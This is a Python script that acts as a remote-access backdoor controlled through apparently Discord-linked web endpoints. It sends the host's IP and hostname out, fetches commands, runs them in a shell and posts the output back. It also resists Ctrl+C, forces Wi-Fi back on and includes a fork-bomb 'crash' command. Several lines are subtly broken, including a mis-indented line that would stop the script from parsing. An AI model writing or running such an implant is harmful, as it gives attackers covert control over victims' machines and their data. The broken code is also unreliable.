try:
    from requests import get, post
    from time import sleep
    from subprocess import Popen as system
    from subprocess import PIPE
    from os import chdir, uname
    from sys import platform

    old_command = ""
    command = ""

    ip = get('https://api.ipify.org').content.decode('utf8')
    hostname = uname()[1]
    post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"New client IP: `{ip}@{hostname}`")
except KeyboardInterrupt:
    try:
        post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"{ip}@{hostname} ``Client tried to SIGINT(Ctrl+C) when init``")
        pass
    except KeyboardInterrupt:
        pass
    pass

while True:
    # prevent keyboardinterrupt
    try:
        #get HTML
        try:
            command = get("https://discord-bot-command-inputter-littleblack111.vercel.app").content.decode()
            if command.startswith('Error: 429 - {"message": "You are being rate limited.", "retry_after":'):
                try:
                    sleep(5)
                    continue
                except KeyboardInterrupt:
                    post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"{ip}@{hostname}: ``Client tried to SIGINT(Ctrl+C) when waiting discord api timeout(rate-limit)``")
        except KeyboardInterrupt:
            try:
                post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"{ip}@{hostname}: ``Client tried to SIGINT(Ctrl+C) when handling discord api``")
            except KeyboardInterrupt:
                system("/usr/sbin/networksetup -setairportpower en0 on")
                continue
            continue
        except:
            system("/usr/sbin/networksetup -setairportpower en0 on")
            sleep(3)
            continue
        # execute command
        localcmd = None
        if old_command != command:
            try:
                if command.startswith("exename "):
                    localcmd = command.split()
                    if localcmd[1] == hostname:
                        del localcmd[:2]
                        localcmd = ' '.join(localcmd)
                    else:
                        old_command = command
                        continue
                if command.startswith("exeos "):
                    localcmd = command.split()
                    if localcmd[1] == platform:
                        del localcmd[:2]
                        localcmd = ' '.join(localcmd)
                    else:
                        old_command = command
                        continue
                if command.startswith("crash"):
                    from os import fork
                    command = command.split()
                    if command[1<len(command)]:
                        for _ in range(command[1]):
                            fork()
                    else:
                        fork()

                
                    
                
#                if command.startswith("ping"):
#                    try:
#                        post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"{ip}@{hostname}: Pong!")
#                    except KeyboardInterrupt:
#                        post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"{ip}@{hostname}: ``Client tried to SIGINT(Ctrl+C) when replying to ping``")
#                    except:
                        system("/usr/sbin/networksetup -setairportpower en0 on")

#                       continue
                if command.startswith("cd"):
                    dir=command.replace('cd', '')
                    try:
                        chdir(dir)
                    except KeyboardInterrupt:
                        try:
                            post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"{ip}@{hostname}: ``Client tried to SIGINT(Ctrl+C) while changing directory``")
                        except KeyboardInterrupt:
                            continue
                        continue
                    except FileNotFoundError:
                        post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``$ {command}`` ```No Such Directory```-{ip}@{hostname}")
                    except:
                        system("/usr/sbin/networksetup -setairportpower en0 on")

                        continue
                old_command = command
                if localcmd:
                    r = system(command, shell=True, stdout=PIPE, stderr=PIPE)
                    cmdout, cmderr = r.communicate()
                else:
                    r = system(command, shell=True, stdout=PIPE, stderr=PIPE)
                    cmdout, cmderr = r.communicate()
                try:
                    if r.returncode != 0:
                        if r.returncode == 127:
                            if localcmd:
                                post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ {localcmd}`` ```Error: {localcmd}: Command not found```")
                            else:
                                post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ {command}`` ```Error: {command}: Command not found```")
                        else:
                            if localcmd:
                                post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ {localcmd}`` ```Error: {cmderr.decode()} exited with code {r.returncode}```- {ip}@{hostname}")
                            else:
                                post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ {command}`` ```Error: {cmderr.decode()} exited with code {r.returncode}```- {ip}@{hostname}")
                    elif r.returncode != 0 and cmdout.decode() == "":
                        post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ {command}`` ```Error: exited with no output and code {r.returncode}```- {ip}@{hostname}")
                except KeyboardInterrupt:
                    try:
                        post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"{ip}@{hostname}: ``Client tried to SIGINT(Ctrl+C) when trying to post (error)output``")
                    except KeyboardInterrupt:
                            continue
                    continue
                except:
                    system("/usr/sbin/networksetup -setairportpower en0 on")

                    continue
                if cmdout.decode() != "" and cmderr.decode() == "":
                    try:
                        if localcmd:
                             post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ {localcmd}`` ```{cmdout.decode()}```")
                        else:
                            post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ {command}`` ```{cmdout.decode()}```")
                    except KeyboardInterrupt:
                        try:
                            post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"{ip}@{hostname}: ``Client tried to SIGINT(Ctrl+C) when trying to post output``")
                        except KeyboardInterrupt:
                                continue
                        continue
                    except:
                        system("/usr/sbin/networksetup -setairportpower en0 on")

                        continue
                elif cmdout.decode() == "" and cmderr.decode() == "":
                    try:
                        post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``$ {command}`` ```Command Executed successfully without output```- {ip}@{hostname}")
                    except KeyboardInterrupt:
                        try:
                            post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"{ip}@{hostname}: ``Client tried to SIGINT(Ctrl+C) when trying to post output``")
                        except KeyboardInterrupt:
                                continue
                        continue
                    except:
                        system("/usr/sbin/networksetup -setairportpower en0 on")

                        continue
                old_command = command
                continue
            except:
                continue
        try:
            sleep(0.1)
        except KeyboardInterrupt:
            try:
                post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"{ip}@{hostname}: ``Client tried to SIGINT(Ctrl+C)``")
            except KeyboardInterrupt:
                continue
            continue
    except KeyboardInterrupt:
        try:
            post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"{ip}@{hostname}: ``Client tried to SIGINT(Ctrl+C)``")
        except KeyboardInterrupt:
            continue
        continue
    except:
        continue
